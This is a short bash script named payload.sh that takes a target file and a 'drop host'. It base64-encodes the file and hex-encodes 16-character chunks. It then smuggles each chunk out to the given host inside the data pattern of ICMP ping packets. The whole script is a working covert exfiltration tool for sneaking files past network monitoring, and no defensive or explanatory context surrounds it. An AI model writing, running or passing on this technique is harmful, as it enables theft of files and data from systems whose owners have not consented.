#!/bin/bash

set -eo pipefail

readonly TARGET_FILE="${1}"
readonly DROP_HOST="${2}"

set -u

usage() {
    echo "${BASH} ./payload.sh <TARGET_FILE> <DROP_HOST>"
}

if [ -z "${TARGET_FILE}" ]; then
    echo "No TARGET_FILE has been defined."
    usage
    exit 2
fi

if [ -z "${DROP_HOST}" ]; then
    echo "No DROP_HOST has been defined."
    usage
    exit 2
fi

IFS=$'\n'
for chunk in $(base64 --wrap=16 "${TARGET_FILE}"); do
    hex_digits=""

    for ((hex_iterator=0; hex_iterator<"${#chunk}"; hex_iterator++)); do
        hex_digits+="$(printf "%X" \'"${chunk:$hex_iterator:1}")"
    done

    if [ "${hex_iterator}" -lt 16 ]; then
        sign_required="$((16 - hex_iterator))"

        for ((sign_iterator=0; sign_iterator<"${sign_required}"; sign_iterator++)); do
            hex_digits+="3D"
        done
    fi

    ping -c 1 -p "${hex_digits}" -q -s 32 -W 1 -4 "${DROP_HOST}" &> /dev/null
done
